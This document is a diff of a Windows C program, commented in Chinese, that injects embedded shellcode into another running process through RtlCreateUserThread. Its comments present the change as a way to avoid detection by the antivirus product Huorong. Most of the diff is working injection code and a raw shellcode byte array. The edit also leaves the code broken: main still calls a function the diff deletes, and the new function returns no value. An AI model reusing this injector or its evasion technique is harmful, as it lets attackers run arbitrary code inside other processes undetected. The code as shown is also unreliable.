@@ -1,25 +1,12 @@
-// 用 gcc 直接编译
-// 用 tcc 编译需要注意引入 windows 的头文件地址
-// cmd> tcc -I"C:\Users\...\winapi-full-for-0.9.27\include\winapi" tcc_injecter.c
-// tcc_injecter.c
+// RtlCreateUserThread 远线程注入处理，至少32位的程序 tcc 编译不会被杀(火绒)
+// 稍微能缓解一点 win32 位的 CreateRemoteThread 类型的远线程注入一创建就被杀的尴尬
+// 不过用 gcc 进行该代码生成时 32 位程序仍然会马上查杀。64位则目前安全使用。
+// cmd> gcc tcc_injecter_rtl.c -ldtdll
+// cmd> tcc tcc_injecter_rtl.c -ldtdll
 
 #include <windows.h>
 #include <stdio.h>
 #include <tlhelp32.h>
-
-BOOL LoadShellcode(DWORD dwProcessId, char* shellcode, int size) {
-    HANDLE hProcess = NULL;
-    HANDLE hThread  = NULL;
-    PSTR   pEntry = NULL;
-    hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcessId);
-    pEntry = (PSTR)VirtualAllocEx(hProcess, NULL, 1 + size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    WriteProcessMemory(hProcess, (PVOID)pEntry, (PVOID)shellcode, 1 + size, NULL);
-    hThread = CreateRemoteThread(hProcess, NULL, 0, (PTHREAD_START_ROUTINE)pEntry, NULL, 0, NULL);
-    // WaitForSingleObject(hThread, INFINITE); // 是否等待注入任务执行完毕再继续此处后续的代码
-    // VirtualFreeEx(hProcess,(PVOID)pEntry,0,MEM_RELEASE);
-    // CloseHandle(hThread); // 是否关闭线程句柄
-    return TRUE;
-}
 
 int getPidByProcessName(char* processname) {
     PROCESSENTRY32 ProcessEntry = { 0 };
@@ -35,7 +22,41 @@ int getPidByProcessName(char* processname) {
     }
 }
 
-void main(int argc, char* argv[]) {
+typedef LONG NTSTATUS;
+typedef NTSTATUS *PNTSTATUS;
+typedef VOID(NTAPI *PUSER_THREAD_START_ROUTINE)(
+    PVOID ApcArgument1
+);
+typedef struct _CLIENT_ID
+{
+    HANDLE  UniqueProcess;
+    HANDLE  UniqueThread;
+} CLIENT_ID, *PCLIENT_ID;
+NTSYSAPI NTSTATUS NTAPI RtlCreateUserThread(
+    HANDLE Process,
+    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor OPTIONAL,
+    BOOLEAN CreateSuspended,
+    ULONG_PTR ZeroBits OPTIONAL,
+    SIZE_T MaximumStackSize OPTIONAL,
+    SIZE_T CommittedStackSize OPTIONAL,
+    PUSER_THREAD_START_ROUTINE StartAddress,
+    PVOID Parameter OPTIONAL,
+    PHANDLE Thread OPTIONAL,
+    PCLIENT_ID ClientId OPTIONAL
+);
+BOOL LoadShellcodeRtl(DWORD dwProcessId, char* shellcode, int size) {
+    NTSTATUS status;
+    HANDLE hProcess = NULL;
+    HANDLE hThread  = NULL;
+    PSTR   pEntry = NULL;
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcessId);
+    pEntry = (PSTR)VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(hProcess, (PVOID)pEntry, (PVOID)shellcode, size, NULL);
+    status = RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, (PVOID)pEntry, NULL, &hThread, NULL);
+}
+
+int main(int argc, char const *argv[])
+{
     // 下面的 shellcode 在被注入的目标程序的执行路径下创建一个 1.txt 文件，并在该线程下进行一次全 NULL 参数弹窗。
     // win64
     // unsigned char shellcode[] = {
@@ -233,7 +254,10 @@ void main(int argc, char* argv[]) {
         0x45,0xe0, 0xe9,0x0a, 0x00,0x00, 0x00,0xe9, 0xbc,0xfe, 0xff,0xff, 0xb8,0x00, 0x00,0x00,
         0x00,0xc9, 0xc2,0x04, 0x00,
     };
-    char processname[MAX_PATH] = TEXT("notepad.exe");
+
+
+    char processname[MAX_PATH] = TEXT("temp.exe");
     int pid = getPidByProcessName(processname);
     LoadShellcode(pid, shellcode, sizeof(shellcode));
+    return 0;
 }
